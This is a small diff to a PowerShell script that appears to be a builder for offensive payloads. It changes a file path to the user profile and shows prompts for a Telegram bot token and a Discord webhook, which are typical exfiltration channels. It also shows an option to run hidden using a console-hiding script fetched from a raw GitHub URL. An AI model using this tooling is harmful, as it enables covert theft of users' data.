@@ -117,7 +117,7 @@ while ($true){
         Write-Host "You selected $($selectedScript.Name)" -ForegroundColor Green
         $tg = Read-Host "Enter a Telegram Bot Token (Optional) "
         $dc = Read-Host "Enter a Discord webhook (Optional) "
-        $fpath = $PWD.Path
+        $fpath = $env:USERPROFILE
         $HideURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Hide-Powershell-Console.ps1"
         $hidden = Read-Host "Would you like to run this in a hidden window? (Y/N)"
         If ($hidden -eq 'y'){
